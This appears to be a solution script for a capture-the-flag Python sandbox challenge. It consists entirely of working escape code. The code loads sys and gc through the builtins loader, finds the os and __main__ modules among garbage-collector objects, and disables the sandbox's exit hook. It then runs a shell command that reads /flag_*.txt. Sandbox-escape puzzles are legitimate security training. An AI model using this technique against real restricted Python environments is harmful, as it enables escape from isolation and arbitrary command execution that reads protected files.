# Load built-in modules
print('Loading built-in modules sys and gc')
sys = __builtins__["__loader__"].load_module('sys')
gc = __builtins__["__loader__"].load_module('gc')

# Search for modules main and os
print('Searching for modules __main__ and os in garbage collector objects')
for obj in gc.get_objects():
    if '__name__' in dir(obj):
        if '__main__' in obj.__name__:
            print('Found module __main__')
            mod_main = obj
        if 'os' == obj.__name__:
            print('Found module os')
            mod_os = obj

# Replace the __exit function in module __main__
print('Replacing the __exit function in module __main__')
mod_main.__exit = lambda x : None

# Getting flag
print('Extracting flag')
print(mod_os.system('cat /flag_*.txt'))
